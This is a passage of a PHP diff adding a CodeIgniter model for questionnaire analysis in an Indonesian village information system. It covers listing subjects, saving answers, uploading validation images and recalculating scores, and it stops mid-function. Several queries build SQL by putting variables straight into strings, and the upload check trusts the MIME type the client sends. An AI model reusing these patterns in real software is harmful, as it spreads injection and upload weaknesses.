+    private function rt_sql(): void
+    {
+        if (empty($this->session->rt) || $this->subjek == 5) {
+            return;
+        }
+
+        $this->db->where('rt', $this->session->rt);
+    }
+
+    // Pertanyaan telah diisi atau belum
+    // $this->session->isi == 1 untuk pertanyaan yg telah diisi
+    private function isi_sql(): void
+    {
+        if (empty($isi = $this->session->isi)) {
+            return;
+        }
+
+        $isi = $isi == 1 ? 1 : 0;
+        $this->db
+            ->where("(SELECT COUNT(id_subjek) FROM analisis_respon_hasil WHERE id_subjek = u.id AND id_periode = {$this->per} AND config_id = '{$this->config_id}') = {$isi}");
+    }
+
+    private function kelompok_sql($kf = 0): void
+    {
+        $this->db->where('id_master', $kf);
+    }
+
+    public function paging($p = 1, $o = 0)
+    {
+        $this->list_data_sql();
+        $jml_data = $this->db
+            ->select('COUNT(*) AS jml_data')
+            ->get()
+            ->row()
+            ->jml_data;
+
+        $paging          = new Paging();
+        $cfg['page']     = $p;
+        $cfg['per_page'] = $_SESSION['per_page'];
+        $cfg['num_rows'] = $jml_data;
+        $paging->init($cfg);
+
+        return $paging;
+    }
+
+    private function list_data_sql()
+    {
+        $id_kelompok = $this->master['id_kelompok'];
+
+        switch ($this->subjek) {
+            case 1:
+                $this->config_id('u')
+                    ->from('penduduk_hidup u')
+                    ->join('tweb_wil_clusterdesa c', 'u.id_cluster = c.id', 'left');
+                break;
+
+            case 2:
+                $this->config_id('u')
+                    ->from('keluarga_aktif u')
+                    ->join('penduduk_hidup p', 'u.nik_kepala = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 3:
+                $this->config_id('u')
+                    ->from('tweb_rtm u')
+                    ->join('penduduk_hidup p', 'u.nik_kepala = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 4:
+                $this->config_id('u')
+                    ->from('kelompok u')
+                    ->join('penduduk_hidup p', 'u.id_ketua = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 5:
+                $this->db
+                    ->from('config u')
+                    ->where('u.app_key', get_app_key());
+                break;
+
+            case 6:
+                $this->config_id('u')
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt', '0')
+                    ->where('u.rw', '0');
+                break;
+
+            case 7:
+                $this->config_id('u')
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt', '0')
+                    ->where('u.rw <>', '0')
+                    ->where('u.rw <>', '-');
+                break;
+
+            case 8:
+                $this->config_id('u')
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt <> 0')
+                    ->where('u.rt <> "-"');
+                break;
+
+            default:
+                return null;
+        }
+        if ($id_kelompok != 0) {
+            $this->kelompok_sql($id_kelompok);
+        }
+
+        $this->search_sql();
+        $this->dusun_sql();
+        $this->rw_sql();
+        $this->rt_sql();
+        $this->isi_sql();
+    }
+
+    public function list_data($o = 0, $offset = 0, $limit = 500)
+    {
+        $this->db
+            ->select("(SELECT a.id_subjek FROM analisis_respon a WHERE a.id_subjek = u.id AND a.id_periode = {$this->per} LIMIT 1) as cek")
+            ->select("(SELECT b.pengesahan FROM analisis_respon_bukti b WHERE b.id_master = {$this->master['id']} AND b.id_periode = {$this->per} AND b.id_subjek = u.id AND b.config_id ={$this->config_id}) as bukti_pengesahan");
+
+        switch ($this->subjek) {
+            case 1:
+                $this->db
+                    ->select('u.id, u.nik AS nid, u.nama, u.sex, c.dusun, c.rw, c.rt');
+                break;
+
+            case 2:
+
+            case 3:
+                $this->db
+                    ->select('u.id, u.no_kk AS nid, p.nama, p.sex, c.dusun, c.rw, c.rt');
+                break;
+
+            case 4:
+                $this->db
+                    ->select('u.id, u.kode AS nid, u.nama, p.sex, c.dusun, c.rw, c.rt');
+                break;
+
+            case 5:
+                $this->db
+                    ->select('u.id, u.kode_desa as nid, u.nama_desa as nama, "-" as sex, "-" as dusun, "-" as rw, "-" as rt');
+                break;
+
+            case 6:
+                $this->db->select("u.id, u.dusun AS nid, CONCAT(UPPER('{$this->setting->sebutan_dusun} '), u.dusun) as nama, '-' as sex, u.dusun, '-' as rw, '-' as rt");
+                break;
+
+            case 7:
+                $this->db->select("u.id, u.rw AS nid, CONCAT( UPPER('{$this->setting->sebutan_dusun} '), u.dusun, ' RW ', u.rw) as nama, '-' as sex, u.dusun, u.rw, '-' as rt");
+                break;
+
+            case 8:
+                $this->db
+                    ->select("u.id, u.rt AS nid, CONCAT( UPPER('{$this->setting->sebutan_dusun} '), u.dusun, ' RW ', u.rw, ' RT ', u.rt) as nama, '-' as sex, u.dusun, u.rw, u.rt");
+                break;
+
+            default:
+                return null;
+        }
+        $this->list_data_sql();
+
+        switch ($o) {
+            case 1:
+                $this->db->order_by('u.id');
+                break;
+
+            case 2:
+                $this->db->order_by('u.id DESC');
+                break;
+
+            case 3:
+                $this->db->order_by('nama');
+                break;
+
+            case 4:
+                $this->db->order_by('nama DESC');
+                break;
+
+            default:
+                $this->db->order_by('u.id');
+        }
+
+        if ($limit > 0) {
+            $this->db->limit($limit, $offset);
+        }
+
+        $data    = $this->db->get()->result_array();
+        $j       = $offset;
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no']     = $j + 1;
+            $data[$i]['set']    = '<img src="' . base_url('assets/images/icon/') . ($data[$i]['cek'] ? 'ok' : 'nok') . '.png">';
+            $data[$i]['jk']     = ($data[$i]['sex'] == 1) ? 'L' : 'P';
+            $data[$i]['alamat'] = $data[$i]['dusun'] . ' RW-' . $data[$i]['rw'] . ' RT-' . $data[$i]['rt'];
+            $j++;
+        }
+
+        return $data;
+    }
+
+    public function data_unduh($p, $o)
+    {
+        $per = $this->analisis_master_model->get_aktif_periode();
+
+        switch ($this->subjek) {
+            case 1:
+                $this->db->select('u.id, u.nik AS nid, u.nama, u.sex, c.dusun, c.rw, c.rt');
+                break;
+
+            case 2:
+                $this->db->select('u.id, u.no_kk AS nid, p.nama, p.sex, c.dusun, c.rw, c.rt');
+                break;
+
+            case 3:
+                $this->db->select('u.id, u.no_kk AS nid, p.nama, p.sex, c.dusun, c.rw,c.rt');
+                break;
+
+            case 4:
+                $this->db->select('u.id, u.kode AS nid, u.nama, p.sex, c.dusun, c.rw, c.rt');
+                break;
+
+            case 5:
+                $this->db->select('u.id, u.kode_desa as nid, u.nama_desa as nama, "-" as sex, "-" as dusun, "-" as rw, "-" as rt');
+                break;
+
+            case 6:
+                $this->db->select("u.id, u.dusun AS nid, CONCAT( UPPER('{$this->setting->sebutan_dusun} '), u.dusun) as nama, '-' as sex, u.dusun, '-' as rw, '-' as rt");
+                break;
+
+            case 7:
+                $this->db->select("u.id, u.rw AS nid, CONCAT( UPPER('{$this->setting->sebutan_dusun} '), u.dusun, ' RW ', u.rw) as nama, '-' as sex, u.dusun, u.rw, '-' as rt");
+                break;
+
+            case 8:
+                $this->db->select("u.id, u.rt AS nid, CONCAT( UPPER('{$this->setting->sebutan_dusun} '), u.dusun, ' RW ', u.rw, ' RT ', u.rt) as nama, '-' as sex, u.dusun, u.rw, u.rt");
+                break;
+
+            default:
+                return null;
+        }
+
+        $this->list_data_sql();
+
+        switch ($o) {
+            case 1:
+                $this->db->order_by('u.id');
+                break;
+
+            case 2:
+                $this->db->order_by('u.id DESC');
+                break;
+
+            case 3:
+                $this->db->order_by('nama');
+                break;
+
+            case 4:
+                $this->db->order_by('nama DESC');
+                break;
+
+            default:
+                $this->db->order_by('u.id');
+        }
+
+        $data    = $this->db->get()->result_array();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no'] = $i + 1;
+            if ($p == 1) {
+                $par = $this->db
+                    ->select('kode_jawaban, asign, jawaban, r.id_indikator, r.id_parameter AS korek')
+                    ->from('analisis_respon r')
+                    ->join('analisis_parameter p', 'p.id = r.id_parameter', 'left')
+                    ->where('r.id_periode', $per)
+                    ->where('r.id_subjek', $data[$i]['id'])
+                    ->order_by('r.id_indikator')
+                    ->get()
+                    ->result_array();
+                $data[$i]['par'] = $par;
+            } else {
+                $data[$i]['par'] = null;
+            }
+
+            $data[$i]['jk'] = ($data[$i]['sex'] == 1) ? 'L' : 'P';
+        }
+
+        return $data;
+    }
+
+    public function update_kuisioner($id = 0, $per = 0): void
+    {
+        $outp                     = true;
+        $this->session->error_msg = '';
+        if ($per == 0) {
+            $per       = $this->analisis_master_model->get_aktif_periode();
+            $id_master = $_SESSION['analisis_master'];
+        } else {
+            $id_master = $this->config_id()->get_where('analisis_periode', ['id' => $per])->row_array();
+            $id_master = $id_master['id_master'];
+        }
+        $ia = 0;
+        $it = 0;
+        $ir = 0;
+        $ic = 0;
+
+        if (isset($_POST['rb'])) {
+            $id_rbx = $_POST['rb'];
+
+            foreach ($id_rbx as $id_px) {
+                if ($id_px != '') {
+                    $ir = 1;
+                }
+            }
+        }
+        if (isset($_POST['cb'])) {
+            $id_rby = $_POST['cb'];
+
+            foreach ($id_rby as $id_py) {
+                if ($id_py != '') {
+                    $ic = 1;
+                }
+            }
+        }
+        if (isset($_POST['ia'])) {
+            $id_iax = $_POST['ia'];
+
+            foreach ($id_iax as $id_px) {
+                if ($id_px != '') {
+                    $ia = 1;
+                }
+            }
+        }
+        if (isset($_POST['it'])) {
+            $id_iay = $_POST['it'];
+
+            foreach ($id_iay as $id_py) {
+                if ($id_py != '') {
+                    $it = 1;
+                }
+            }
+        }
+
+        //CEK ada input
+        if ($ir != 0 || $ic != 0 || $ia != 0 || $it != 0) {
+            $this->db->where('id_subjek', $id)->where('id_periode', $per)->delete('analisis_respon');
+            if (! empty($_POST['rb'])) {
+                $id_rb = $_POST['rb'];
+
+                foreach ($id_rb as $id_p) {
+                    if (empty($id_p)) {
+                        continue;
+                    } // Abaikan isian kosong
+                    $p = preg_split('/\\./', $id_p);
+
+                    $data['id_subjek']    = $id;
+                    $data['id_periode']   = $per;
+                    $data['id_indikator'] = $p[0];
+                    $data['id_parameter'] = $p[1];
+                    $outp &= $this->db->insert('analisis_respon', $data);
+                }
+            }
+            if (isset($_POST['cb'])) {
+                $id_cb = $_POST['cb'];
+                if ($id_cb) {
+                    foreach ($id_cb as $id_p) {
+                        $p = preg_split('/\\./', $id_p);
+
+                        $data['id_subjek']    = $id;
+                        $data['id_periode']   = $per;
+                        $data['id_indikator'] = $p[0];
+                        $data['id_parameter'] = $p[1];
+                        $outp &= $this->db->insert('analisis_respon', $data);
+                    }
+                }
+            }
+
+            if (isset($_POST['ia'])) {
+                $id_ia = $_POST['ia'];
+
+                foreach ($id_ia as $id_p) {
+                    if ($id_p != '') {
+                        unset($data);
+                        $indikator = key($id_ia);
+                        $dx        = $this->config_id()
+                            ->get_where('analisis_parameter', ['jawaban' => $id_p, 'id_indikator' => $indikator])
+                            ->row_array();
+                        if (! $dx) {
+                            $data['id_indikator'] = $indikator;
+                            $data['jawaban']      = $id_p;
+                            $data['config_id']    = $this->config_id;
+                            $outp &= $this->db->insert('analisis_parameter', $data);
+                            unset($data);
+                            $dx = $this->config_id()
+                                ->get_where('analisis_parameter', ['jawaban' => $id_p, 'id_indikator' => $indikator])
+                                ->row_array();
+                            $data['id_parameter'] = $dx['id'];
+                            $data['id_indikator'] = $indikator;
+                            $data['id_subjek']    = $id;
+                            $data['id_periode']   = $per;
+                            $outp &= $this->db->insert('analisis_respon', $data);
+                        } else {
+                            unset($data);
+                            $data['id_indikator'] = $indikator;
+                            $data['id_parameter'] = $dx['id'];
+                            $data['id_subjek']    = $id;
+                            $data['id_periode']   = $per;
+                            $outp &= $this->db->insert('analisis_respon', $data);
+                        }
+                    }
+                    next($id_ia);
+                }
+            }
+            if (isset($_POST['it'])) {
+                $id_it = $_POST['it'];
+
+                foreach ($id_it as $id_p) {
+                    if ($id_p != '') {
+                        unset($data);
+                        $indikator = key($id_it);
+                        $dx        = $this->config_id()
+                            ->get_where('analisis_parameter', ['jawaban' => $id_p, 'id_indikator' => $indikator])
+                            ->row_array();
+                        if (! $dx) {
+                            $data['id_indikator'] = $indikator;
+                            $data['jawaban']      = $id_p;
+                            $data['config_id']    = $this->config_id;
+                            $outp &= $this->db->insert('analisis_parameter', $data);
+                            unset($data);
+                            $dx = $this->config_id()
+                                ->get_where('analisis_parameter', ['jawaban' => $id_p, 'id_indikator' => $indikator])
+                                ->row_array();
+                            $data2['id_parameter'] = $dx['id'];
+                            $data2['id_indikator'] = $indikator;
+                            $data2['id_subjek']    = $id;
+                            $data2['id_periode']   = $per;
+                            $outp &= $this->db->insert('analisis_respon', $data2);
+                        } else {
+                            unset($data);
+                            $data['id_indikator'] = $indikator;
+                            $data['id_parameter'] = $dx['id'];
+                            $data['id_subjek']    = $id;
+                            $data['id_periode']   = $per;
+                            $outp &= $this->db->insert('analisis_respon', $data);
+                        }
+                    }
+                    next($id_it);
+                }
+            }
+
+            $sql   = 'SELECT SUM(i.bobot * nilai) as jml FROM analisis_respon r LEFT JOIN analisis_indikator i ON r.id_indikator = i.id LEFT JOIN analisis_parameter z ON r.id_parameter = z.id WHERE r.id_subjek = ? AND i.act_analisis=1 AND r.id_periode=? ';
+            $query = $this->db->query($sql, [$id, $per]);
+            $dx    = $query->row_array();
+
+            $upx['id_master']  = $id_master;
+            $upx['akumulasi']  = 0 + $dx['jml'];
+            $upx['id_subjek']  = $id;
+            $upx['id_periode'] = $per;
+            $upx['config_id']  = $this->config_id;
+            $this->config_id()->where('id_subjek', $id)->where('id_periode', $per)->delete('analisis_respon_hasil');
+            $outp &= $this->db->insert('analisis_respon_hasil', $upx);
+        }
+        if (isset($_FILES['pengesahan'])) {
+            $lokasi_file = $_FILES['pengesahan']['tmp_name'];
+            $tipe_file   = $_FILES['pengesahan']['type'];
+            if (! empty($lokasi_file)) {
+                if ($tipe_file != 'image/jpeg' && $tipe_file != 'image/pjpeg') {
+                    $_SESSION['sukses'] = -1;
+                } else {
+                    $nama_file = $_SESSION['analisis_master'] . '_' . $per . '_' . $id . '_' . random_int(10000, 99999) . '.jpg';
+                    UploadPengesahan($nama_file);
+                    $bukti['pengesahan'] = $nama_file;
+                    $bukti['id_master']  = $id_master;
+                    $bukti['id_subjek']  = $id;
+                    $bukti['id_periode'] = $per;
+                    $bukti['config_id']  = identitas('id');
+
+                    $ada_bukti = $this->config_id()->where(['id_master' => $id_master, 'id_subjek' => $id, 'id_periode' => $per])->get('analisis_respon_bukti')->num_rows();
+                    if ($ada_bukti > 0) {
+                        $outp = $this->config_id()->where(['id_master' => $id_master, 'id_subjek' => $id, 'id_periode' => $per])->update('analisis_respon_bukti', $bukti);
+                    } else {
+                        $outp &= $this->db->insert('analisis_respon_bukti', $bukti);
+                    }
+                }
+            }
+        }
+        status_sukses($outp);
+    }
+
+    private function list_jawab2($id = 0, $in = 0, $per = 0)
+    {
+        if (isset($this->session->delik)) {
+            $query = $this->config_id('s')
+                ->select('s.id as id_parameter,s.jawaban,s.kode_jawaban')
+                ->where('id_indikator', $in)
+                ->order_by('s.kode_jawaban', 'ASC')
+                ->get('analisis_parameter s');
+        } else {
+            $query = $this->config_id('s')
+                ->select('s.id as id_parameter,s.jawaban,s.kode_jawaban')
+                ->select('(SELECT count(id_subjek) FROM analisis_respon WHERE id_parameter = s.id AND id_subjek =' . $id . ' AND id_periode=' . $per . ') as cek')
+                ->where('id_indikator', $in)
+                ->order_by('s.kode_jawaban', 'ASC')
+                ->get('analisis_parameter s');
+        }
+
+        $data    = $query->result_array();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no'] = $i + 1;
+            if (isset($this->session->delik)) {
+                $data[$i]['cek'] = 0;
+            }
+        }
+
+        return $data;
+    }
+
+    private function list_jawab3($id = 0, $in = 0, $per = 0)
+    {
+        return $this->db
+            ->select('s.id as id_parameter,s.jawaban')
+            ->from('analisis_respon r')
+            ->join('analisis_parameter s', 'r.id_parameter = s.id', 'left')
+            ->where('r.id_indikator', $in)
+            ->where('r.id_subjek', $id)
+            ->where('r.id_periode', $per)
+            ->get()
+            ->row_array();
+    }
+
+    public function list_indikator($id = 0)
+    {
+        $per = $this->analisis_master_model->get_aktif_periode();
+
+        $data = $this->db
+            ->select('u.id, u.id_kategori, u.nomor, u.id_tipe, u.pertanyaan, u.referensi, k.kategori')
+            ->from('analisis_indikator u')
+            ->join('analisis_kategori_indikator k', 'u.id_kategori = k.id', 'left')
+            ->where('u.id_master', $this->session->analisis_master)
+            ->order_by("LPAD(u.nomor, 10, ' ') ASC")
+            ->get()
+            ->result_array();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no'] = $i + 1;
+
+            if ($data[$i]['id_tipe'] == 1 || $data[$i]['id_tipe'] == 2) {
+                $data[$i]['parameter_respon'] = $this->list_jawab2($id, $data[$i]['id'], $per);
+            } else {
+                $data[$i]['parameter_respon'] = (isset($this->session->delik)) ? '' : $this->list_jawab3($id, $data[$i]['id'], $per);
+            }
+        }
+
+        return $data;
+    }
+
+    //CHILD-----------------------
+
+    private function list_jawab4($id = 0, $in = 0, $per = 0)
+    {
+        if (isset($this->session->delik)) {
+            $query = $this->config_id('s')
+                ->select('s.id as id_parameter,s.jawaban,s.kode_jawaban')
+                ->where('id_indikator', $in)
+                ->get('analisis_parameter s');
+        } else {
+            $query = $this->config_id('s')
+                ->select('s.id as id_parameter,s.jawaban,s.kode_jawaban')
+                ->select('(SELECT count(id_subjek) FROM analisis_respon WHERE id_parameter = s.id AND id_subjek =' . $id . ' AND id_periode=' . $per . ') as cek')
+                ->where('id_indikator', $in)
+                ->get('analisis_parameter s');
+        }
+        $data    = $query->result_array();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no'] = $i + 1;
+            if (isset($this->session->delik)) {
+                $data[$i]['cek'] = 0;
+            }
+        }
+
+        return $data;
+    }
+
+    private function list_jawab5($id = 0, $in = 0, $per = 0)
+    {
+        return $this->db
+            ->select('s.id as id_parameter,s.jawaban')
+            ->from('analisis_respon r')
+            ->join('analisis_parameter s', 'r.id_parameter = s.id', 'left')
+            ->where('r.id_indikator', $in)
+            ->where('r.id_subjek', $id)
+            ->where('r.id_periode', $per)
+            ->get()
+            ->row_array();
+    }
+
+    public function list_indikator_child($id = 0)
+    {
+        $id_child = $this->config_id()
+            ->select('id_child')
+            ->where('id', $_SESSION['analisis_master'])
+            ->get('analisis_master')
+            ->row_array();
+        $id_child = $id_child['id_child'];
+
+        $per = $this->config_id()
+            ->select('id')
+            ->where('id_master', $id_child)
+            ->where('aktif', 1)
+            ->get('analisis_periode')
+            ->row_array();
+        $per = $per['id'];
+
+        $data = $this->config_id('u')
+            ->where('u.id_master', $id_child)
+            ->order_by('u.nomor')
+            ->get('analisis_indikator u')
+            ->result_array();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no'] = $i + 1;
+
+            if ($data[$i]['id_tipe'] == 1 || $data[$i]['id_tipe'] == 2) {
+                $data[$i]['parameter_respon'] = $this->list_jawab4($id, $data[$i]['id'], $per);
+            } else {
+                $data[$i]['parameter_respon'] = (isset($this->session->delik)) ? '' : $this->list_jawab5($id, $data[$i]['id'], $per);
+            }
+        }
+
+        return $data;
+    }
+
+    public function get_periode_child()
+    {
+        $id_child = $this->config_id()
+            ->select('id_child')
+            ->where('id', $_SESSION['analisis_master'])
+            ->get('analisis_master')
+            ->row_array();
+        $id_child = $id_child['id_child'];
+
+        $per = $this->config_id()
+            ->select('id')
+            ->where('id_master', $id_child)
+            ->where('aktif', 1)
+            ->get('analisis_periode')
+            ->row_array();
+
+        return $per['id'];
+    }
+    //---------------------------
+
+    public function list_bukti($id = 0)
+    {
+        $per = $this->analisis_master_model->get_aktif_periode();
+
+        return $this->config_id()
+            ->select('pengesahan')
+            ->where('id_subjek', $id)
+            ->where('id_master', $_SESSION['analisis_master'])
+            ->where('id_periode', $per)
+            ->order_by('tgl_update', 'DESC')
+            ->get('analisis_respon_bukti')
+            ->result_array();
+    }
+
+    public function get_subjek($id = 0)
+    {
+        $sebutan_dusun = ucwords($this->setting->sebutan_dusun);
+
+        switch ($this->subjek) {
+            case 1:
+                $this->config_id('u')
+                    ->select('u.*, u.nik AS nid, c.dusun, c.rw, c.rt')
+                    ->select("CONCAT('{$sebutan_dusun} ', c.dusun, ', RT ', c.rt, ' / RW ', c.rw) as wilayah")
+                    ->from('penduduk_hidup u')
+                    ->join('tweb_wil_clusterdesa c', 'u.id_cluster = c.id', 'left');
+                break;
+
+            case 2:
+                $this->config_id('u')
+                    ->select('u.*, u.no_kk AS nid, p.nik AS nik_kepala, p.nama, p.sex, c.dusun, c.rw, c.rt')
+                    ->select("CONCAT('{$sebutan_dusun} ', c.dusun, ', RT ', c.rt, ' / RW ', c.rw) as wilayah")
+                    ->from('keluarga_aktif u')
+                    ->join('penduduk_hidup p', 'u.nik_kepala = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'u.id_cluster = c.id', 'left');
+
+                break;
+
+            case 3:
+                $this->config_id('u')
+                    ->select('u.id, u.no_kk AS nid, p.nama, p.sex, c.dusun, c.rw, c.rt')
+                    ->from('tweb_rtm u')
+                    ->join('penduduk_hidup p', 'u.nik_kepala = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 4:
+                $this->config_id('u')
+                    ->select('u.nama AS no_kk, p.nama')
+                    ->from('kelompok u')
+                    ->join('penduduk_hidup p', 'u.id_ketua = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 5:
+                $this->db
+                    ->select("u.id, u.kode_desa AS nid, u.nama_desa as nama, '-' as sex, '-' as dusun, '-' as rw, '-' as rt")
+                    ->select("
+                        u.nama_desa, u.kode_desa, u.kode_pos, u.alamat_kantor, u.telepon as no_telepon_kantor_desa, u.email_desa, CONCAT('Lintang : ', u.lat, ', ', 'Bujur : ', u.lng) as titik_koordinat_desa")
+                    ->select('
+                        c.pamong_nip AS nip_kepala_desa,
+                        (case when p.sex is not null then p.sex else c.pamong_sex end) as jk_kepala_desa,
+                        (case when p.pendidikan_kk_id is not null then b.nama else c.pamong_pendidikan end) as pendidikan_kepala_desa,
+                        (case when p.nama is not null then p.nama else c.pamong_nama end) AS nama_kepala_desa,
+                        p.telepon as no_telepon_kepala_desa
+                    ')
+                    ->from('config u')
+                    ->join('tweb_desa_pamong c', 'u.pamong_id = c.pamong_id', 'left')
+                    ->join('tweb_penduduk p', 'c.id_pend = p.id', 'left')
+                    ->join('tweb_penduduk_pendidikan_kk b', 'p.pendidikan_kk_id = b.id', 'LEFT')
+                    ->join('tweb_penduduk_sex x', 'p.sex = x.id', 'LEFT')
+                    ->join('tweb_penduduk_pendidikan_kk b2', 'c.pamong_pendidikan = b2.id', 'LEFT')
+                    ->join('tweb_penduduk_sex x2', 'c.pamong_sex = x2.id', 'LEFT')
+                    ->where('u.app_key', get_app_key());
+
+                break;
+
+            case 6:
+                $this->config_id('u')
+                    ->select("u.id, u.dusun AS nid, UPPER('{$sebutan_dusun}') as nama, '-' as sex, u.dusun, '-' as rw, '-' as rt")
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt', '0')
+                    ->where('u.rw', '0');
+                break;
+
+            case 7:
+                $this->config_id('u')
+                    ->select("u.id, u.rw AS nid, CONCAT( UPPER('{$sebutan_dusun} '), u.dusun, ' RW ', u.rw) as nama, '-' as sex, u.dusun, u.rw, '-' as rt")
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt', '0')
+                    ->where('u.rw <>', '0');
+                break;
+
+            case 8:
+                $this->config_id('u')
+                    ->select("u.id, u.rt AS nid, CONCAT( UPPER('{$sebutan_dusun} '), u.dusun, ' RW ', u.rw, ' RT ', u.rt) as nama, '-' as sex, u.dusun, u.rw, u.rt")
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt <> 0')
+                    ->where('u.rt <> "-"');
+                break;
+
+            default:
+                return null;
+        }
+        $data = $this->db
+            ->where('u.id', $id)
+            ->limit(1)
+            ->get()
+            ->row_array();
+
+        // Data tambahan subjek desa
+        if ($this->subjek == 5) {
+            $tambahan = [
+                'jumlah_total_penduduk'            => $this->config_id()->count_all_results('penduduk_hidup'),
+                'jumlah_penduduk_laki_laki'        => $this->config_id()->where('sex', 1)->count_all_results('penduduk_hidup'),
+                'jumlah_penduduk_perempuan'        => $this->config_id()->where('sex', 2)->count_all_results('penduduk_hidup'),
+                'jumlah_penduduk_pedatang'         => $this->config_id()->where('status', 2)->count_all_results('penduduk_hidup'),
+                'jumlah_penduduk_yang_pergi'       => $this->config_id()->where('kode_peristiwa', 3)->count_all_results('log_penduduk'),
+                'jumlah_total_kepala_keluarga'     => $this->config_id('u')->join('penduduk_hidup t', 'u.nik_kepala = t.id', 'left')->count_all_results('keluarga_aktif u'),
+                'jumlah_kepala_keluarga_laki_laki' => $this->config_id('u')->join('penduduk_hidup t', 'u.nik_kepala = t.id', 'left')->where('sex', 1)->count_all_results('keluarga_aktif u'),
+                'jumlah_kepala_keluarga_perempuan' => $this->config_id('u')->join('penduduk_hidup t', 'u.nik_kepala = t.id', 'left')->where('sex', 2)->count_all_results('keluarga_aktif u'),
+                'jumlah_peserta_bpjs'              => $this->config_id()->where('bpjs_ketenagakerjaan != ', null)->count_all_results('penduduk_hidup'),
+            ];
+
+            $data = array_merge($data, $tambahan);
+        }
+
+        return $data;
+    }
+
+    public function list_anggota($id = 0)
+    {
+        $subjek = $this->subjek;
+        if ($subjek == 2 || $subjek == 3) {
+            switch ($subjek) {
+                case 2:
+                    return $this->config_id('u')
+                        ->where('u.id_kk', $id)
+                        ->order_by('kk_level')
+                        ->get('penduduk_hidup u')
+                        ->result_array();
+
+                case 3:
+                    return $this->config_id('u')
+                        ->where('u.id_rtm', $id)
+                        ->order_by('rtm_level')
+                        ->get('penduduk_hidup u')
+                        ->result_array();
+
+                default:
+                    return null;
+            }
+        }
+
+        return null;
+    }
+
+    public function aturan_unduh()
+    {
+        $data = $this->config_id('u')
+            ->select('u.*, t.tipe AS tipe_indikator, k.kategori AS kategori')
+            ->from('analisis_indikator u')
+            ->join('analisis_tipe_indikator t', 'u.id_tipe = t.id', 'left')
+            ->join('analisis_kategori_indikator k', 'u.id_kategori = k.id', 'left')
+            ->where('u.id_master', $_SESSION['analisis_master'])
+            ->order_by('u.nomor')
+            ->get()
+            ->result_array();
+
+        $this->analisis_master_model->get_aktif_periode();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no'] = $i + 1;
+
+            if ($data[$i]['id_tipe'] == 1 || $data[$i]['id_tipe'] == 2) {
+                $data[$i]['par'] = $this->config_id('i')
+                    ->select('i.id, i.kode_jawaban, i.jawaban')
+                    ->from('analisis_parameter i')
+                    ->where('i.id_indikator', $data[$i]['id'])
+                    ->order_by('i.kode_jawaban')
+                    ->get()
+                    ->result_array();
+            } else {
+                $data[$i]['par'] = null;
+            }
+            $data[$i]['act_analisis'] = $data[$i]['act_analisis'] == 1 ? 'Ya' : 'Tidak';
+        }
+
+        return $data;
+    }
+
+    public function indikator_data_unduh()
+    {
+        $data = $this->config_id('u')
+            ->where('u.id_master', $_SESSION['analisis_master'])
+            ->order_by('u.nomor')
+            ->get('analisis_indikator u')
+            ->result_array();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no']  = $i + 1;
+            $data[$i]['par'] = null;
+            $data[$i]['par'] = $this->config_id()
+                ->select('id_parameter')
+                ->where('id_indikator', $data[$i]['id'])
+                ->where('asign', 1)
+                ->get('analisis_parameter')
+                ->result_array();
+        }
+
+        return $data;
+    }
+
+    public function indikator_unduh($p = 0)
+    {
+        $data = $this->config_id('u')
+            ->where('u.id_master', $this->session->analisis_master)
+            ->order_by('LPAD(u.nomor, 10, " ")')
+            ->get('analisis_indikator u')
+            ->result_array();
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $data[$i]['no']  = $i + 1;
+            $data[$i]['par'] = null;
+
+            if ($p == 2) {
+                $par = $this->config_id()
+                    ->where('id_indikator', $data[$i]['id'])
+                    ->where('asign', 1)
+                    ->get('analisis_parameter')
+                    ->result_array();
+                $data[$i]['par'] = $par;
+            }
+        }
+
+        return $data;
+    }
+
+    public function pre_update($pr = 0): void
+    {
+        $per = $pr == 0 ? $this->analisis_master_model->get_aktif_periode() : $pr;
+
+        $sql   = 'SELECT DISTINCT(id_subjek) AS id FROM analisis_respon WHERE id_periode = ? ';
+        $query = $this->db->query($sql, $per);
+        $data  = $query->result_array();
+
+        $sql = 'DELETE FROM analisis_respon_hasil WHERE id_subjek = 0  AND config_id=' . identitas('id');
+        $this->db->query($sql);
+
+        $sql = 'DELETE FROM analisis_respon WHERE id_subjek = 0';
+        $this->db->query($sql);
+
+        $sql = 'DELETE FROM analisis_respon_hasil WHERE id_periode = ? AND config_id=' . identitas('id');
+        $this->db->query($sql, $per);
+        $counter = count($data);
+
+        for ($i = 0; $i < $counter; $i++) {
+            $sql   = 'SELECT SUM(i.bobot * nilai) as jml FROM analisis_respon r LEFT JOIN analisis_indikator i ON r.id_indikator = i.id LEFT JOIN analisis_parameter z ON r.id_parameter = z.id WHERE r.id_subjek = ? AND i.act_analisis=1 AND r.id_periode=?';
+            $query = $this->db->query($sql, [$data[$i]['id'], $per]);
+            $dx    = $query->row_array();
+
+            $upx[$i]['id_master']  = $_SESSION['analisis_master'];
+            $upx[$i]['akumulasi']  = 0 + $dx['jml'];
+            $upx[$i]['id_subjek']  = $data[$i]['id'];
